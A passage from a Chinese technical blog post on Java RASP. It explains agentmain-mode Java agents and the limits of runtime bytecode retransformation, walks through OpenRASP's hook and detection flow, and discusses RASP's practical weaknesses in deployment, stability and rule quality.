Class[] loadedClasses = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clazz : loadedClasses) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">"com.lucifaer.test_agentmain.TestAgentMain"</span>.equals(clazz.getName())) &#123;</span><br><span class="line">                <span class="keyword">if</span> (inst.isModifiableClass(clazz) &amp;&amp; !clazz.getName().startsWith(<span class="string">"java.lang.invoke.LambdaForm"</span>)) &#123;</span><br><span class="line">                    inst.retransformClasses(clazz);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>agentmain</code>模式和<code>premain</code>的大致写法是没有区别的，最大的区别在于<strong>如果想要利用agentmain模式来对运行后的类进行修改，需要利用Instrumentation.retransformClasses方法来对需要修改的类进行重新转换</strong>。</p><p>想要<code>agentmain</code>工作还需要编写一个方法来利用Attach API来动态启动agent：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AttachAgent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException </span>&#123;</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor vmd : list) &#123;</span><br><span class="line">            <span class="keyword">if</span> (vmd.displayName().endsWith(<span class="string">"TestAgentMain"</span>)) &#123;</span><br><span class="line">                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());</span><br><span class="line">                virtualMachine.loadAgent(<span class="string">"/Users/Lucifaer/Dropbox/Code/Java/agentmain_test/out/artifacts/agentmain_test_jar/agentmain_test.jar"</span>, <span class="string">"Attach!"</span>);</span><br><span class="line">                System.out.println(<span class="string">"ok"</span>);</span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15692220517395.jpg" alt=""></p><h3 id="3-3-3-agentmain坑点"><a href="#3-3-3-agentmain坑点" class="headerlink" title="3.3.3 agentmain坑点"></a>3.3.3 agentmain坑点</h3><p>这里有一个坑点也导致没有办法在<code>agentmain</code>模式下动态给一个类添加一个新的方法，如果尝试添加一个新的方法就会报错。下面是我编写利用<code>agentmain</code>模式尝试给类动态增加一个方法的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DynamicClassTransformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Instrumentation inst;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String descriptor;</span><br><span class="line">    <span class="keyword">private</span> String[] exceptions;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DynamicClassTransformer</span><span class="params">(Instrumentation inst)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.inst = inst;</span><br><span class="line">        inst.addTransformer(<span class="keyword">this</span>, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        System.out.println(<span class="string">"In transformer"</span>);</span><br><span class="line">        ClassReader cr = <span class="keyword">new</span> ClassReader(classfileBuffer);</span><br><span class="line">        ClassWriter cw = <span class="keyword">new</span> ClassWriter(cr, ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        ClassVisitor cv = <span class="keyword">new</span> ClassVisitor(Opcodes.ASM5, cw) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> i, String s, String s1, String s2, String[] strings)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">final</span> MethodVisitor mv = <span class="keyword">super</span>.visitMethod(i, s, s1, s2, strings);</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">"say"</span>.equals(s)) &#123;</span><br><span class="line">                    name = s;</span><br><span class="line">                    descriptor = s1;</span><br><span class="line">                    exceptions = strings;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> mv;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"><span class="comment">//        ClassVisitor cv = new DynamicClassVisitor(Opcodes.ASM5, cw);</span></span><br><span class="line">        cr.accept(cv, ClassReader.EXPAND_FRAMES);</span><br><span class="line">        MethodVisitor mv;</span><br><span class="line">        mv = cw.visitMethod(Opcodes.ACC_PUBLIC, <span class="string">"say2"</span>, <span class="string">"()V"</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        mv.visitCode();</span><br><span class="line">        Label l0 = <span class="keyword">new</span> Label();</span><br><span class="line">        mv.visitLabel(l0);</span><br><span class="line">        mv.visitLineNumber(<span class="number">23</span>, l0);</span><br><span class="line">        mv.visitFieldInsn(Opcodes.GETSTATIC, <span class="string">"java/lang/System"</span>, <span class="string">"out"</span>, <span class="string">"Ljava/io/PrintStream;"</span>);</span><br><span class="line">        mv.visitLdcInsn(<span class="string">"2"</span>);</span><br><span class="line">        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, <span class="string">"java/io/PrintStream"</span>, <span class="string">"println"</span>, <span class="string">"(Ljava/lang/String;)V"</span>, <span class="keyword">false</span>);</span><br><span class="line">        Label l1 = <span class="keyword">new</span> Label();</span><br><span class="line">        mv.visitLabel(l1);</span><br><span class="line">        mv.visitLineNumber(<span class="number">24</span>, l1);</span><br><span class="line">        mv.visitInsn(Opcodes.RETURN);</span><br><span class="line">        Label l2 = <span class="keyword">new</span> Label();</span><br><span class="line">        mv.visitLabel(l2);</span><br><span class="line">        mv.visitLocalVariable(<span class="string">"this"</span>, <span class="string">"Lcom/lucifaer/test_agentmain/TestAgentMain;"</span>, <span class="keyword">null</span>, l0, l2, <span class="number">0</span>);</span><br><span class="line">        mv.visitMaxs(<span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">        mv.visitEnd();</span><br><span class="line">        classfileBuffer = cw.toByteArray();</span><br><span class="line"></span><br><span class="line">        FileOutputStream fos = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"agent.class"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">assert</span> fos != <span class="keyword">null</span>;</span><br><span class="line">            fos.write(classfileBuffer);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">retransform</span><span class="params">()</span> <span class="keyword">throws</span> UnmodifiableClassException </span>&#123;</span><br><span class="line">        LinkedList&lt;Class&gt; retransformClasses = <span class="keyword">new</span> LinkedList&lt;Class&gt;();</span><br><span class="line">        Class[] loadedClasses = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clazz : loadedClasses) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">"com.lucifaer.test_agentmain.TestAgentMain"</span>.equals(clazz.getName())) &#123;</span><br><span class="line">                <span class="keyword">if</span> (inst.isModifiableClass(clazz) &amp;&amp; !clazz.getName().startsWith(<span class="string">"java.lang.invoke.LambdaForm"</span>)) &#123;</span><br><span class="line">                    inst.retransformClasses(clazz);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15692252359662.jpg" alt=""></p><p>这里尝试添加一个public方法是直接失败的，原因就在于原生的JVM在运行时时为了程序的线程及逻辑安全，禁止向运行时的类添加新的public方法并重新定义该类。JVM默认规则是只能修改方法体中的逻辑，所以这就意味着会有这么一个问题：<strong>当多次attach时，代码会重复插入</strong>，这样是不符合热部署逻辑的。</p><p>当然目前市面上也有一定的解决方案，如<a href="https://zeroturnaround.com/software/jrebel/" target="_blank" rel="noopener">JRebel</a>和<a href="https://github.com/spring-projects/spring-loaded" target="_blank" rel="noopener">Spring-Loaded</a>，它们的实现方式是在<code>method call</code>和<code>field access</code>的方法做了一层代理，而这一点对于RASP来说，无疑是加重了部署难度，反而与热部署简单快捷的方式背道而驰。</p><h1 id="0x04-OpenRASP的具体实现方式"><a href="#0x04-OpenRASP的具体实现方式" class="headerlink" title="0x04 OpenRASP的具体实现方式"></a>0x04 OpenRASP的具体实现方式</h1><p>以上大致将Java RASP的相关内容介绍完毕后，这部分来深入了解一下OpenRASP的Java RASP这一部分是怎么写的，执行流是如何。</p><h2 id="4-1-OpenRASP执行流"><a href="#4-1-OpenRASP执行流" class="headerlink" title="4.1 OpenRASP执行流"></a>4.1 OpenRASP执行流</h2><p>OpenRASP的执行流很简单主要分为以下几部分：</p><ol><li>agent初始化</li><li>V8引擎初始化</li><li>日志配置模块初始化</li><li>插件模块初始化</li><li>hook点管理模块初始化</li><li>字节码转换模块初始化</li></ol><p>其中具体实现管理hook点以及添加hook点的部分主要集中于5、6这一部分，这里同样是我们最为关注的地方。</p><h2 id="4-2-初始化流程"><a href="#4-2-初始化流程" class="headerlink" title="4.2 初始化流程"></a>4.2 初始化流程</h2><p>在这一部分不会对OpenRASP流程进行一步步的跟踪，只会将其中较为关键的点进行分析。</p><h3 id="4-2-1-agent初始化"><a href="#4-2-1-agent初始化" class="headerlink" title="4.2.1 agent初始化"></a>4.2.1 agent初始化</h3><p>通过前面几节的介绍，其实是可以发现RASP类的编写共同点的——其入口就是<code>premain</code>或<code>agentmain</code>方法，这些都会在<code>META-INFO/MANIFEST.MF</code>中标明：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15692311458729.jpg" alt=""></p><p>所以其入口就是<code>com.baidu.openrasp.Agent</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15692312237657.jpg" alt=""></p><p>这里在模块加载前做了一个非常重要的操作——<strong>将Java agent的jar包加入到BootStrap class path中</strong>，如果不进行特殊设定，则会默认将jar包加入到System class path中，对于研究过类加载机制的朋友们来说一定不陌生，这样做得好处就是可以将jar包加到<code>BootStrapClassLoader</code>所加载的路径中，在类加载时可以保证加载顺序位于最顶层，这样就可以不受到类加载顺序的限制，拦截拦截系统类。</p><p>当将jar包添加进BootStrap class path后，就是完成模块加载的初始化流程中，这里会根据指定的jar包来实例化模块加载的主流程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15692321790464.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15692321482369.jpg" alt=""></p><p>这里的ENGINE_JAR是<code>rasp-engine.jar</code>，也就是源码中的engine模块。这里根据配置文件中的数值通过反射的方式实例化相应的主流程类：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15692326060518.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15692326391992.jpg" alt=""></p><p>然后就可以一目了然的看到模块初始化主流程了：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15692328006619.jpg" alt=""></p><p>在主流程中，我们重点关注红框部分，这一部分完成了hook点管理模块初始化，以及字节码转换模块的初始化。</p><h3 id="4-2-2-hook点管理模块初始化"><a href="#4-2-2-hook点管理模块初始化" class="headerlink" title="4.2.2 hook点管理模块初始化"></a>4.2.2 hook点管理模块初始化</h3><p>hook点管理的初始化过程非常简单，就是遍历<code>com.baidu.openrasp.plugin.checkerCheckParameter</code>的Type，将其中的元素添加进枚举映射中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15692345992774.jpg" alt=""></p><p>在Type这个枚举类型中，定义了不同类型的攻击类型所对应的检测方式：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15692346834091.jpg" alt=""></p><h3 id="4-2-3-字节码转换模块初始化"><a href="#4-2-3-字节码转换模块初始化" class="headerlink" title="4.2.3 字节码转换模块初始化"></a>4.2.3 字节码转换模块初始化</h3><p>字节码转换模块是整个Java RASP的重中之重，OpenRASP是使用的Javassist来操作字节码的，其大致的写法和ASM并无区别，接下来一步步跟进看一下。</p><p>在<code>com.baidu.openrasp.EngineBoot#initTransformer</code>中完成了字节码转换模块的初始化：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15692936334997.jpg" alt=""></p><p>这里可以看到在实例化了<code>ClassFileTransformer</code>实现的<code>CustomClassTransformer</code>后，调用了一个自己写的<code>retransform</code>方法，在这个方法中对<code>Instrumentation</code>已加载的所有类进行遍历，将其进行类的重新转换：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15692963561020.jpg" alt=""></p><p>这里主要是为了支持<code>agentmain</code>模式对类进行重新转换。</p><p>在解释完了<code>retranform</code>后，我们来整体看一下OpenRASP是如何添加hook点并完成相应hook流程的。这一部分是在<code>com.baidu.openrasp.transformer#CustomClassTransformer</code>中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15692935304718.jpg" alt=""></p><p>我们都清楚<code>inst.addTransformer</code>的功能是在类加载时做拦截，对输入的类的字节码进行修改，也就是具体的检测流程插入都在这一部分。但是OpenRASP的hook点是在哪里加入的呢？其实就是在<code>addAnnotationHook</code>这里完成的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15693148353863.jpg" alt=""></p><p>这里会到<code>com.baidu.openrasp.hook</code>下对所有的类进行扫描，将所有由<code>HookAnnotation</code>注解的类全部加入到<code>HashSet</code>中，例如OgnlHook：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15693150496091.jpg" alt=""></p><p>至此就完成了字节码转换模块的初始化。</p><h2 id="4-3-类加载拦截流程"><a href="#4-3-类加载拦截流程" class="headerlink" title="4.3 类加载拦截流程"></a>4.3 类加载拦截流程</h2><p>前文已经介绍过RASP的具体拦截流程是在<code>ClassFileTransformer#transform</code>中完成的，在OpenRASP中则是在<code>CustomClassTransformer#transform</code>中完成的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15693194804204.jpg" alt=""></p><p>可以看到先检测当前拦截类是否为已经注册的需要hook的类，如果是hook的类则直接利用javassist的方式创建<code>ctClass</code>，想要具体了解javassist的使用方式的同学，可以直接看javassist的官方文档，这里不再过多表述。</p><p>可以看到在创建完<code>ctClass</code>后，直接调用了当前hook的<code>transformClass</code>方法。由于接下来涉及到跟进具体的hook处理类中，所以接下来的分析是以跟进<code>OgnlHook</code>这个hook来跟进的。</p><p><code>OgnlHook</code>是继承于<code>AbstractClassHook</code>的，在<code>AbstractClassHook</code>中预定义了很多虚方法，同时也提供了很多通用的方法，<code>transformClass</code>方法就是在这里定义的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15693198460598.jpg" alt=""></p><p>这里直接调用了每个具体hook类的<code>hookMethod</code>方法来执行具体的逻辑，值得注意的是这里的最终返回也是一个<code>byte</code>数组，具体的流程和ASM并无两样。跟进<code>OgnlHook#hookMethod</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15693199760579.jpg" alt=""></p><p>这里首先生成需要插入到代码中的字节码，然后调用其自己写的<code>inserAfter</code>来将字节码插入到hook点的后面（其实就是决定是插在hook方法最顶部，还是return前的最后一行，这决定了调用顺序）。</p><p>可以简单的看一下插入的字节码是如何生成的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15693203131952.jpg" alt=""></p><p>很简单，就是插入一段代码，这段代码将反射实例化当前hook类，调用<code>methodName</code>所指定的方法，并将<code>paramString</code>所指定的参数传入该方法中。所以接下来看一下<code>OgnlHook#checkOgnlExpression</code>方法所执行的逻辑：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15693205652450.jpg" alt=""></p><p>判断获取的表达式是不是<code>String</code>类型，如果是，将表达式放入<code>HashMap</code>中，然后调用<code>HookHandler.doCheck</code>方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15693206710905.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15693206924482.jpg" alt=""></p><p>在这里说一句题外话，可以看到在这里的逻辑设定是当服务器cpu使用率超过90%时，禁用全部的hook点。这也是RASP要思考解决的一个问题，当负载过高时，一定要给业务让步，也就一定要停止防护功能，不然会引发oom，直接把业务搞崩。所以如何尽量的减少资源占用也是RASP需要解决的一个大问题。</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15693209819777.jpg" alt=""></p><p>这里就是检测的主要逻辑，主要完成：</p><ul><li>检测计时</li><li>获取检测结果</li><li>根据检测结果判断是否要进行拦截</li></ul><p>具体看一下如何获取的检测结果：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15693210594055.jpg" alt=""></p><p>这里的<code>checkers</code>是在hook点管理模块初始化时设置的枚举类映射，所以这里调用的是：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15693211779876.jpg" alt=""></p><p><code>V8Checker().check()</code>方法，继承树如下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15693213086308.jpg" alt=""></p><p>所以具体的实现是在<code>AbstractChecker#check</code>中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15693213753323.jpg" alt=""></p><p>也就是<code>V8Checker#checkParam</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15693214246792.jpg" alt=""></p><p>这里就一目了然了，是调用JS插件来完成检测的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15693216185113.jpg" alt=""></p><p>easygame，就是在JS插件（其实就是个js文件）中寻找相应的规则进行规则匹配。这个js文件在<code>OpenRASP根目录/plugins/official/plugin.js</code>中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15693218880207.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15693221211184.jpg" alt=""></p><p>如果符合匹配规则则返回block，完成攻击拦截。</p><p>至此整个拦截流程分析完毕。</p><h2 id="4-4-小结"><a href="#4-4-小结" class="headerlink" title="4.4 小结"></a>4.4 小结</h2><p>从上面的分析中可以看出OpenRASP的实现方式还是比较简单的，其中非常有创新点的是利用js来编写规则，通过V8来执行js。<strong>利用js来编写规则的好处是更加方便热部署以及规则的通用性，同时减少了为不同语言重复制定相同规则的问题</strong>。</p><p>同样，OpenRASP也不免存在RASP本身存在的一些缺陷，这些缺陷将在“缺陷思考”这一节中具体的描述。</p><h1 id="0x05-缺陷思考"><a href="#0x05-缺陷思考" class="headerlink" title="0x05 缺陷思考"></a>0x05 缺陷思考</h1><p>虽然Java RASP是以Java Instrumentation的工作方式工作在JVM层，可以通过hook引发漏洞的关键函数，在关键函数前添加安全检查，这看上去像是一个“all in one”的通用解，但是其实存在很多问题。</p><h2 id="5-1-“通用解”的通用问题"><a href="#5-1-“通用解”的通用问题" class="headerlink" title="5.1 “通用解”的通用问题"></a>5.1 “通用解”的通用问题</h2><p><strong>所有“通用解”的最大问题都出现在通用性上</strong>。在真实场景中RASP的应用环境比其在实验环境中复杂的多，如果想要一个RASP真正的运行在业务上就需要从乙方和甲方的角度双向思考问题，以下是我想到的一些问题，可能有些偏颇，但是还是希望能给一些参考性的意见：</p><h3 id="5-1-1-语言环境的通配适用性"><a href="#5-1-1-语言环境的通配适用性" class="headerlink" title="5.1.1 语言环境的通配适用性"></a>5.1.1 语言环境的通配适用性</h3><p>企业内部的web应用纷繁复杂，有用Java编写的应用，有用Go编写的，还有用PHP、Python写的等等…，那么如何对这些不同语言所构建的应用程序都实现相应的防护？</p><p>对于甲方来说，我购置一套安全防护产品肯定是要能起到通用防护的作用的，肯定不会只针对Java购进一套Java RASP，这样做未免也太亏了。</p><p>对于乙方来说，每一种语言都有不同的特性，都要用不同的方式构建RASP，对于开发和安全研究人员来说工作量是相当之大的，强如OpenRASP团队目前也只是支持PHP和Java两个版本的。</p><p>这很大程度上也是影响到RASP推广的一个原因。看看传统的WAF、旁路流量监测等产品，它并不受语言的限制，只关心流量中是否存在具有威胁的流量就好，巧妙的减少了一个变量，从而加强了泛用性，无论什么样的环境都可以快速部署发挥作用，对于企业来说，肯定是更愿意购入WAF的。</p><h3 id="5-1-2-部署的通配适用性"><a href="#5-1-2-部署的通配适用性" class="headerlink" title="5.1.2 部署的通配适用性"></a>5.1.2 部署的通配适用性</h3><p>由于开发人员所擅长的技能不同或不同项目组的技能树设定的不同，企业内部往往会存在使用各种各样框架实现的代码。而在代码部署上，如果没有一开始就制定严格的规范的话，部署环境也会存在各种各样的情况。就拿Java来说，企业内部可能存在Struts2写的、Spring写的、RichFaces写的等等…，同时这些应用可能部署在不同的中间件上：Tomcat、Weblogic、JBoss、Websphere等等…，不同的框架，不同的中间件部署方式都或多或少的有所不同，想要实现通配，真的不容易。</p><h3 id="5-1-3-规则的通用性"><a href="#5-1-3-规则的通用性" class="headerlink" title="5.1.3 规则的通用性"></a>5.1.3 规则的通用性</h3><p>这一点其实已经被OpenRASP较好的解决了，统一利用js做规则，然后利用js引擎解析规则。所以这一点不多赘述。</p><h2 id="5-2-自身稳定性的问题"><a href="#5-2-自身稳定性的问题" class="headerlink" title="5.2 自身稳定性的问题"></a>5.2 自身稳定性的问题</h2><p>“安全产品首先要保证自己是安全的”，这句话说出来感觉是比较搞笑的，但是往往很多的安全产品其自身安全性就很差，只是仗着黑盒的不确定性才保持自己的神秘感罢了。对于RASP来说这句话更是需要严格奉行。因为RASP是将检测逻辑插入到hook点中的，只要到达了相应的hook点，检测逻辑是一定会被执行的，如果这个时候RASP实现的检测逻辑本身出现了问题，严重的话会导致整个业务崩溃，或直接被打穿。</p><h3 id="5-2-1-执行逻辑稳定性"><a href="#5-2-1-执行逻辑稳定性" class="headerlink" title="5.2.1 执行逻辑稳定性"></a>5.2.1 执行逻辑稳定性</h3><p>就像上文所说的一样，如果在RASP所执行的逻辑中出现了严重的错误，将会直接将错误抛出在业务逻辑中，轻则当前业务中断，重则整个服务中断，这对于甲方来说就是严重的事故，甚至比服务器被攻击还严重。</p><p>简单来举个例子（当然在真实写RASP的时候不会这么写，这里只是展示严重性），如果在RASP的检测逻辑中存在<code>exit()</code>这样的利用，将直接导致程序退出：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15693833968474.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15693834303108.jpg" alt=""></p><p>这也就是为什么很多甲方并不喜欢RASP这种方式，因为归根到底，RASP还是将代码插入到业务执行流中，不出问题还好，出了问题就会影响业务。相比来说，WAF最多就是误封，但是并不会down掉业务，稳定性上是有一定保障的。</p><h3 id="5-2-2-自身安全稳定性"><a href="#5-2-2-自身安全稳定性" class="headerlink" title="5.2.2 自身安全稳定性"></a>5.2.2 自身安全稳定性</h3><p>试想一个场景，如果RASP本身存在一定的漏洞，那是不是相当的可怕？即使原来的应用是没有明显的安全威胁的，但是在RASP处理过程中存在漏洞，而恰巧攻击者传入一个利用这样漏洞的payload，将直接在RASP处理流中完成触发。</p><p>举个实际的例子，比如在RASP中使用了受漏洞影响的FastJson库来处理相应的json数据，那么当攻击者在发送FastJson反序列化攻击payload的时候就会造成目标系统被RCE。</p><p>这其实并不是一个危言耸听的例子，OpenRASP在某版本使用的就是FastJson来处理json字符串，而当时的FastJson版本就是存在漏洞的版本。所以在最新的OpenRASP中，统一使用了较为安全的Gson来处理json字符串。</p><p>RASP的处理思路就决定了其与业务是联系非常紧密的，可以说就是业务的“一部分”，所以如果RASP自己的代码不规范不安全，最终将导致直接给业务写了一个漏洞。</p><h3 id="5-2-3-规则的稳定性"><a href="#5-2-3-规则的稳定性" class="headerlink" title="5.2.3 规则的稳定性"></a>5.2.3 规则的稳定性</h3><p>RASP的规则是需要经过专业的安全研究人员反复打磨并且根据业务来定制化的，需要尽量将所有的可能性都考虑进去，同时尽量的减少误报。但是由于规则贡献者水平的参差不齐，很容易导致规则遗漏，从而根本无法拦截相关的攻击，或产生大量的攻击误报。这样对于甲方来说无疑是一笔稳赔的买卖——花费大量时间进行部署，花费大量服务器资源来启用RASP，最终的安全效果却还是不尽如人意。</p><p>如果想要尽量的完善规则，只能更加贴近业务场景，针对不同的情况做不同的规则判别。所以说规则和业务场景是分不开的，对乙方来说不深入开发、不深入客户是很难做好安全产品的，如果只是停留在实验阶段，是永远没有办法向工程化和产品化转换的。</p><h2 id="5-3-部署复杂性的问题"><a href="#5-3-部署复杂性的问题" class="headerlink" title="5.3 部署复杂性的问题"></a>5.3 部署复杂性的问题</h2><p>在0x03以及0x04中不难看理想中最佳的Java RASP实践方式是使用<code>agentmain</code>模式进行无侵入部署，但是受限于JVM进程保护机制没有办法对目标类添加新的方法，所以就会造成多次attach造成的重复字节码插入的问题。目前主流的Java RASP推荐的部署方式都是利用<code>premain</code>模式进行部署，这就造成了必须停止相关业务，加入相应的启动参数，再开启服务这么一个复杂的过程。</p><p>对于甲方来说，重启一次业务完成部署RASP的代价是比较高的，所以都是不愿意采取这样的方案的。而且在甲方企业内部存在那么多的服务，一台台部署显然也是不现实的。目前所提出的自动化部署方案也受限于实际业务场景的复杂性，并不稳定。</p><h1 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 